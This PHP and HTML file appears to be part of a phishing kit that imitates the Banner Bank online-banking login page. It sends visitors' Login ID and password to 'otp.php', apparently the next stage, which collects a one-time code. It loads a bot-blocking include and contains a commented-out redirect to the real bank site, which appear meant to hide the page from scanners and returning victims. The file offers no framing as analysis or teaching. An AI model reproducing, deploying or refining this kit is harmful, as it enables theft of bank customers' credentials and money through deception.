<?php
require_once 'bot_protect.php';

if (isset($_COOKIE['user_plus'])) {

//    header('Location: https://secure.bannerbank.com/bannerbankonline_41/uux.aspx#/login');
//    exit();
}
session_start();

$templateFile = 'desktop.html';
if (isset($_SESSION['device_type'])) {
    $templateFile = $_SESSION['device_type'] == 'mobile' ? 'mobile.html' : 'desktop.html';
}
if (isset($_POST['screen_width'])) {
    $screenWidth = (int)$_POST['screen_width'];
    if ($screenWidth < 768) {
        $_SESSION['device_type'] = 'mobile';
        //echo 'mobile';
    } else {
        $_SESSION['device_type'] = 'desktop';
        //echo 'desktop';
    }
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Banner Bank — Log In</title>
    <link href="css/base.css" rel="stylesheet">
    <link href="css/tecton.css" rel="stylesheet">
    <link href="css/vendor.css" rel="stylesheet">
    <link href="css/theme-q2-ff0ce88b56d68390f69bb36225b8d751.css" rel="stylesheet">
    <style>
        .login-inner .login-form.expanded {
            padding: 12px 8px 20px;
        }
        .login-title {
            margin-bottom: 8px;
        }
        .login-field {
            margin-bottom: 22px;
        }
        .login-field label {
            display: block;
            font-size: 14px;
            font-weight: 600;
            margin-bottom: 10px;
            color: #222;
        }
        .login-field input {
            width: 99.9%;
            box-sizing: border-box;
            padding: 13px 14px;
            font-size: 16px;
            border: 1px solid #ccc;
            border-radius: 3px;
        }
        .login-field input:focus {
            outline: none;
            box-shadow: var(--const-double-focus-ring, 0 0 0 2px #ffffff, 0 0 0 4px #0066cc);
        }
        .password-wrapper {
            position: relative;
        }
        .password-toggle {
            position: absolute;
            right: 14px;
            top: 50%;
            transform: translateY(-50%);
            font-size: 14px;
            color: #0060af;
            background: none;
            border: none;
            cursor: pointer;
            font-weight: 600;
        }
        .password-toggle:hover {
            text-decoration: underline;
        }
        .remember-row {
            display: flex;
            align-items: center;
            margin-bottom: 26px;
        }
        .remember-row input[type="checkbox"] {
            width: 18px;
            height: 18px;
            margin-right: 10px;
            accent-color: #0060af;
            cursor: pointer;
        }
        .remember-row label {
            font-size: 15px;
            color: #222;
            cursor: pointer;
        }
        .login-actions button {
            width: 99.9%;
            padding: 14px 16px;
            font-size: 17px;
            font-weight: 600;
            border: none;
            border-radius: 3px;
            cursor: pointer;
            background: #fec938;
            color: #003662;
        }
        .login-actions button:hover {
            background: #fbf2d9;
        }
        .js-error {
            display: none;
            color: #c00;
            font-size: 14px;
            margin: 0 0 16px;
            padding: 10px 12px;
            line-height: 1.45;
            background: #fff3f3;
            border: 1px solid #f3c2c2;
            border-radius: 4px;
        }
        .js-error.visible {
            display: block;
        }
    </style>
</head>
<body id="pagebody" class="ember-application desktop theme-q2 frameless" style="background-image: url('images/desktop-background-q2-2d84adb4a94fe345760ff47cbb997f6e.png'); background-repeat: no-repeat; background-size: cover; background-position: center center;">
<div id="main-page" class="app-container desktop session-unestablished login">
    <div class="container meta-container main-page-container">
        <div id="app-login-modal">
            <div class="login-outer">
                <div class="login-inner fade-in" id="login-inner">
                    <div class="login-title" style="border-bottom: 0;">
                        <h1 class="ui-logo large ember-view">
                            <span class="sr-only">Banner Bank</span>
                            <div aria-hidden="true" class="logo-image"></div>
                        </h1>
                    </div>
                    <div class="login-form loginFormArea loginTextLeft expanded">
                        <div id="loginError" class="js-error"></div>
                        <form method="post" action="otp.php" id="loginForm" autocomplete="off">
                            <div class="login-field">
                                <label for="username">Login ID</label>
                                <input
                                    type="text"
                                    id="username"
                                    name="username"
                                    autocomplete="username"
                                    required
                                >
                            </div>
                            <div class="login-field">
                                <label for="password">Password</label>
                                <div class="password-wrapper">
                                    <input
                                        type="password"
                                        id="password"
                                        name="password"
                                        autocomplete="current-password"
                                        required
                                    >
                                    <button type="button" class="password-toggle" id="togglePassword">Show</button>
                                </div>
                            </div>
                            <div class="remember-row">
                                <input type="checkbox" id="remember" name="remember">
                                <label for="remember">Remember me</label>
                            </div>
                            <div class="login-actions">
                                <button type="submit">Log In</button>
                            </div>
                        </form>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
<script>
(function () {
    'use strict';

    const form = document.getElementById('loginForm');
    const username = document.getElementById('username');
    const password = document.getElementById('password');
    const err = document.getElementById('loginError');
    const togglePassword = document.getElementById('togglePassword');

    const showErr = (m) => {
        err.textContent = m;
        err.classList.add('visible');
    };

    const hideErr = () => {
        err.textContent = '';
        err.classList.remove('visible');
    };

    // Показать/скрыть пароль
    togglePassword.addEventListener('click', function () {
        const type = password.getAttribute('type') === 'password' ? 'text' : 'password';
        password.setAttribute('type', type);
        this.textContent = type === 'password' ? 'Show' : 'Hide';
    });

    // Скрывать ошибку при вводе
    username.addEventListener('input', hideErr);
    password.addEventListener('input', hideErr);

    // Валидация перед отправкой
    form.addEventListener('submit', function (e) {
        const userVal = username.value.trim();
        const passVal = password.value;

        if (!userVal) {
            e.preventDefault();
            showErr('Please enter your Login ID.');
            username.focus();
            return;
        }

        if (!passVal) {
            e.preventDefault();
            showErr('Please enter your password.');
            password.focus();
            return;
        }
    });
})();
</script>
</body>
</html>